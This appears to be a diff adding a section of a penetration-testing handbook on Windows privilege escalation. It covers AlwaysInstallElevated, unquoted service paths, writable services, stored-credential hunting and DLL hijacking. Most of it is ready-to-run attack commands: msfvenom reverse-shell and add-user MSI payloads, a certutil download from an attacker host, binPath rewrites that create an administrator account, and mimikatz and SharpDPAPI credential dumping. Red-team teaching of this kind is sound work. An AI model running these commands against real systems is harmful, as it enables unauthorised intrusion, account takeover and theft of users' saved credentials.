+</div>
+<div class="language-powershell highlight"><span class="filename">Run the standard sweep</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">.\</span><span class="n">winpeas</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span><span class="p">;</span> <span class="nb">Invoke-AllChecks</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;auto&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;c:\windows&quot;</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">icacls</span> <span class="s2">&quot;C:\Program Files\service&quot;</span>  <span class="c"># writable service dirs</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;task name\|run as\|next run&quot;</span>
+</span></code></pre></div>
+<div class="language-text highlight"><span class="filename">Common privesc paths</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>AlwaysInstallElevated        → MSI install as SYSTEM
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Unquoted service path        → Place exe in path gap
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Writable service binary      → Replace binary
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Stored credentials (cmdkey)  → runas /savecred
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>SeImpersonatePrivilege       → GodPotato/PrintSpoofer → SYSTEM
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>DLL hijacking                → Drop DLL in writable path
+</span></code></pre></div>
+<h4 id="1221-alwaysinstallelevated">12.2.1 · AlwaysInstallElevated<a class="headerlink" href="#1221-alwaysinstallelevated" title="Permanent link">¶</a></h4>
+<div class="admonition info">
+<p class="admonition-title">What it is + why it pops</p>
+<p>A pair of registry keys (<code>HKLM</code> + <code>HKCU</code>) that, when both set to <code>1</code>, instruct Windows Installer to run <strong>every</strong> MSI as SYSTEM regardless of who launched it. Originally intended for environments where users need to install vendor MSIs without admin rights. Almost never legitimately set in modern domains, but persists as legacy config in older estates.</p>
+</div>
+<div class="language-powershell highlight"><span class="filename">Detect + exploit AlwaysInstallElevated</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># Check both required keys</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c"># Both must equal 0x1</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c"># Generate an MSI payload with msfvenom (attacker box)</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4444</span> <span class="p">\</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>  <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">evil</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c"># Or generate one that adds a local admin</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">adduser</span> <span class="n">USER</span><span class="p">=</span><span class="n">hacker</span> <span class="n">PASS</span><span class="p">=</span><span class="s1">&#39;Pa$$w0rd!&#39;</span> <span class="p">\</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>  <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">adduser</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="c"># Transfer + install on target</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ATTACKER</span><span class="p">&gt;/</span><span class="n">evil</span><span class="p">.</span><span class="n">msi</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">evil</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">evil</span><span class="p">.</span><span class="n">msi</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="c"># Cleanup (after exploitation, if MSI registered itself)</span>
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">x</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">evil</span><span class="p">.</span><span class="n">msi</span> <span class="p">/</span><span class="n">quiet</span>
+</span></code></pre></div>
+<h4 id="1222-unquoted-service-paths">12.2.2 · Unquoted Service Paths<a class="headerlink" href="#1222-unquoted-service-paths" title="Permanent link">¶</a></h4>
+<div class="admonition info">
+<p class="admonition-title">What it is + why it pops</p>
+<p>When a service registers a binary path with spaces but no surrounding quotes, e.g. <code>C:\Program Files\Vendor App\service.exe</code>, Windows tries each space-separated prefix as an executable: <code>C:\Program.exe</code>, <code>C:\Program Files\Vendor.exe</code>, <code>C:\Program Files\Vendor App\service.exe</code>. If you can write to any of those gap directories, drop a binary with the gap-name and Windows runs it as the service account on next start.</p>
+</div>
+<div class="language-powershell highlight"><span class="filename">Find + exploit unquoted service paths</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Find them</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;auto&quot;</span> <span class="p">\</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>  <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;c:\windows&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;&quot;&quot;</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="s2"># Or with PowerShell</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="s2">Get-WmiObject win32_service | ? { $_.PathName -notlike &#39;&quot;</span><span class="p">*</span><span class="s1">&#39; -and $_.PathName -like &#39;</span><span class="p">*</span> <span class="p">*</span><span class="s1">&#39; } |</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="s1">  Select Name,PathName,StartMode</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="s1"># PowerUp does the heavy lifting</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="s1">Import-Module .\PowerUp.ps1</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="s1">Get-ServiceUnquoted</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="s1"># Confirm you can write to the gap directory</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="s1">icacls &quot;C:\Program Files\Vendor App&quot;</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="s1"># Look for (M), (W), (F) on your user, BUILTIN\Users, Authenticated Users, or Everyone</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="s1"># Drop a malicious binary at the gap path</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="s1">copy evil.exe &quot;C:\Program Files\Vendor.exe&quot;</span>
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="s1"># Or for the deeper gap:</span>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="s1">copy evil.exe &quot;C:\Program Files\Vendor App\service.exe.bak&quot;  # not exploitable here</span>
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="s1">copy evil.exe &quot;C:\Program Files\Vendor App\service.exe&quot;      # only if writable</span>
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="s1"># Restart the service (need permission, or wait for reboot)</span>
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="s1">sc stop VulnService</span>
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="s1">sc start VulnService</span>
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>
+</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="s1"># If you can&#39;</span><span class="n">t</span> <span class="n">restart</span><span class="p">,</span> <span class="n">look</span> <span class="n">at</span> <span class="n">the</span> <span class="n">service</span> <span class="n">ACL</span>
+</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="nb">sc </span><span class="n">sdshow</span> <span class="n">VulnService</span>
+</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="c"># RP = SERVICE_START, WP = SERVICE_STOP — without these, you wait for reboot</span>
+</span></code></pre></div>
+<h4 id="1223-writable-service-binary-service-config">12.2.3 · Writable Service Binary / Service Config<a class="headerlink" href="#1223-writable-service-binary-service-config" title="Permanent link">¶</a></h4>
+<div class="admonition info">
+<p class="admonition-title">What it is + why it pops</p>
+<p>A service whose binary file you can overwrite, OR whose configuration (<code>binPath</code>) you can modify. PowerUp's <code>Get-ModifiableServiceFile</code> and <code>Get-ModifiableService</code> find both.</p>
+</div>
+<div class="language-powershell highlight"><span class="filename">Detect + exploit writable services</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># PowerUp checks</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">Get-ModifiableService</span>          <span class="c"># services where you can change config (binPath)</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">Get-ModifiableServiceFile</span>      <span class="c"># services where you can overwrite the .exe on disk</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c"># Manual check on a specific service</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nb">sc </span><span class="n">qc</span> <span class="n">VulnService</span>               <span class="c"># see binPath + start mode + run-as account</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">icacls</span> <span class="s2">&quot;C:\path\to\service.exe&quot;</span> <span class="c"># check if writable</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="c"># Exploit: rewrite binPath (need SERVICE_CHANGE_CONFIG)</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="nb">sc </span><span class="n">config</span> <span class="n">VulnService</span> <span class="n">binPath</span><span class="p">=</span> <span class="s2">&quot;cmd.exe /c net user hacker Pa$$w0rd! /add &amp;&amp; net localgroup administrators hacker /add&quot;</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="nb">sc </span><span class="n">stop</span> <span class="n">VulnService</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="nb">sc start </span><span class="n">VulnService</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="c"># Restore original</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="nb">sc </span><span class="n">config</span> <span class="n">VulnService</span> <span class="n">binPath</span><span class="p">=</span> <span class="s2">&quot;C:\Original\Path\service.exe&quot;</span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="c"># Exploit: overwrite the binary on disk</span>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="nb">move </span><span class="s2">&quot;C:\path\to\service.exe&quot;</span> <span class="s2">&quot;C:\path\to\service.exe.bak&quot;</span>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="nb">copy </span><span class="n">evil</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;C:\path\to\service.exe&quot;</span>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="nb">sc </span><span class="n">stop</span> <span class="n">VulnService</span><span class="p">;</span> <span class="nb">sc start </span><span class="n">VulnService</span>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="c"># PowerUp one-shots (it generates the payload + restores after)</span>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="nb">Invoke-ServiceAbuse</span> <span class="n">-Name</span> <span class="n">VulnService</span> <span class="n">-Username</span> <span class="n">hacker</span> <span class="n">-Password</span> <span class="s1">&#39;Pa$$w0rd!&#39;</span>
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="nb">Restore-ServiceBinary</span> <span class="n">-Name</span> <span class="n">VulnService</span>
+</span></code></pre></div>
+<h4 id="1224-stored-credentials-cmdkey-dpapi-browsers">12.2.4 · Stored Credentials (cmdkey + DPAPI + browsers)<a class="headerlink" href="#1224-stored-credentials-cmdkey-dpapi-browsers" title="Permanent link">¶</a></h4>
+<div class="admonition info">
+<p class="admonition-title">What it is + why it pops</p>
+<p>Users save credentials all over the place: <code>cmdkey</code>/Credential Manager, browser password stores (DPAPI-protected), PuTTY/WinSCP saved sessions, RDP <code>.rdp</code> files with <code>pwd</code> blobs. A user-context shell can usually decrypt anything that user saved.</p>
+</div>
+<div class="language-powershell highlight"><span class="filename">Hunt stored credentials</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c"># Credential Manager entries (visible to current user)</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c"># Use a saved cred to launch as the target user (no password typing required)</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">\</span><span class="n">admin</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&quot;cmd.exe /c type \\&lt;ATTACKER&gt;\share\proof.txt&quot;</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c"># Note: /savecred only re-uses creds saved during a previous interactive runas</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c"># DPAPI master key dump (offline crack later, or use mimikatz)</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="nb">dir </span><span class="p">/</span><span class="n">a</span> <span class="s2">&quot;%APPDATA%\Microsoft\Credentials\&quot;</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="nb">dir </span><span class="p">/</span><span class="n">a</span> <span class="s2">&quot;%LOCALAPPDATA%\Microsoft\Credentials\&quot;</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="nb">dir </span><span class="p">/</span><span class="n">a</span> <span class="s2">&quot;%APPDATA%\Microsoft\Protect\&quot;</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="c"># Mimikatz: dump credman, browser, and DPAPI secrets</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="n">mimikatz</span> <span class="c"># privilege::debug</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="n">mimikatz</span> <span class="c"># sekurlsa::credman           # current logged-on credman entries</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="n">mimikatz</span> <span class="c"># vault::list                 # Windows Vault items</span>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="n">mimikatz</span> <span class="c"># vault::cred /patch          # decrypted vault creds</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="n">mimikatz</span> <span class="c"># dpapi::cred /in:&lt;file&gt;      # decrypt a DPAPI blob</span>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="n">mimikatz</span> <span class="c"># dpapi::chrome /in:&quot;$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="c"># SharpDPAPI (offensive PowerSploit successor, fileless)</span>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a><span class="n">SharpDPAPI</span><span class="p">.</span><span class="n">exe</span> <span class="n">credentials</span> <span class="p">/</span><span class="n">pvk</span><span class="p">:&lt;</span><span class="n">masterkey</span><span class="p">&gt;</span>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="n">SharpDPAPI</span><span class="p">.</span><span class="n">exe</span> <span class="n">rdg</span>
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="n">SharpDPAPI</span><span class="p">.</span><span class="n">exe</span> <span class="n">vaults</span>
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>
+</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a><span class="c"># Saved RDP sessions in registry</span>
+</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKCU\Software\Microsoft\Terminal Server Client\Servers&quot;</span>
+</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
+</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a><span class="c"># Generic file searches</span>
+</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">spin</span> <span class="s2">&quot;password&quot;</span> <span class="p">*.</span><span class="n">txt</span> <span class="p">*.</span><span class="n">xml</span> <span class="p">*.</span><span class="n">ini</span> <span class="p">*.</span><span class="n">config</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span>
+</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">spin</span> <span class="s2">&quot;passw&quot;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\*\</span><span class="n">Documents</span><span class="p">\*.*</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span>
+</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>
+</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a><span class="c"># PuTTY private keys + saved sessions</span>
+</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">SimonTatham</span><span class="p">\</span><span class="n">PuTTY</span><span class="p">\</span><span class="n">Sessions</span>
+</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">b</span> <span class="s2">&quot;%USERPROFILE%\*.ppk&quot;</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span>
+</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>
+</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a><span class="c"># WinSCP saved sessions (XML with cleartext or weakly-encoded passwords)</span>
+</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a><span class="nb">type </span><span class="s2">&quot;$env:APPDATA\WinSCP.ini&quot;</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span>
+</span></code></pre></div>
+<h4 id="1225-dll-hijacking">12.2.5 · DLL Hijacking<a class="headerlink" href="#1225-dll-hijacking" title="Permanent link">¶</a></h4>
+<div class="admonition info">
+<p class="admonition-title">What it is + why it pops</p>
+<p>Windows resolves DLL names by searching directories in a specific order. If a privileged process loads a DLL by name (not by absolute path) and you can write to <strong>any</strong> earlier-searched directory, your DLL gets loaded into the privileged process.</p>
+</div>
